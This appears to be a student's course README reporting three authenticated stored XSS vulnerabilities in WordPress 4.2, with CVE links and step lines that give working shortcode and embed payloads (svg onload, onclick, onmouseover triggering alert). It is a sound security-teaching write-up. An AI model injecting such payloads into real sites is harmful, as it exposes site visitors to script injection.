# Project 7 - WordPress Pentesting

Time spent: **X** hours spent in total

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pentesting Report

1. (Required) 4.0-4.7.2 - Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds
  - [x] Summary: 
    - Vulnerability types:XSS
    - Tested in version:4.2
    - Fixed in version: 4.2.13
  - [x] GIF Walkthrough: 
  <img src='https://github.com/Hanyuatwork/Cyber_week_7/blob/master/Week7_1.gif' title='Video Walkthrough' width='' alt='Video Walkthrough' />
  
  - [x] Steps to recreate: 
    Try to post a new page, which include the embed code [embed src='https://youtube.com/embed/123\x3csvg onload=alert(1)\x3e'][/embed]
    
  - [x] Affected source code:
    - [Link 1](https://github.com/WordPress/WordPress/commit/419c8d97ce8df7d5004ee0b566bc5e095f0a6ca8)
    
1. (Required) WordPress <= 4.2.2 - Authenticated Stored Cross-Site Scripting (XSS)
  - [x] Summary: 
    - Vulnerability types:XSS
    - Tested in version:4.2
    - Fixed in version: 4.2.3
  - [x] GIF Walkthrough: 
   <img src='https://github.com/Hanyuatwork/Cyber_week_7/blob/master/Week7_2.gif' title='Video Walkthrough' width='' alt='Video Walkthrough' />
  - [x] Steps to recreate: 
  Try to post a new page, which include the code <a href="[caption code=">]</a><a title=" onclick=alert('XSS!')  ">link</a>
  
  - [x] Affected source code:
    - [Link 1](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5622)
    
1. (Required) WordPress <= 4.3 - Authenticated Shortcode Tags Cross-Site Scripting (XSS)
  - [x] Summary: 
    - Vulnerability types:xss
    - Tested in version:4.2
    - Fixed in version: 4.3.1
  - [x] GIF Walkthrough: 
   <img src='https://github.com/Hanyuatwork/Cyber_week_7/blob/master/Week7_3.gif' title='Video Walkthrough' width='' alt='Video Walkthrough' />
  - [x] Steps to recreate: 
    Try to post a new page, which include the code [caption width="1" caption='<a href="' ">]</a><a href=" onmouseover='alert("XSS!")' ">Click</a>
  - [x] Affected source code:
    - [Link 1](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5714)


## Assets

List any additional assets, such as scripts or files

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

Describe any challenges encountered while doing the work

## License

    Copyright [yyyy] [name of copyright owner]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
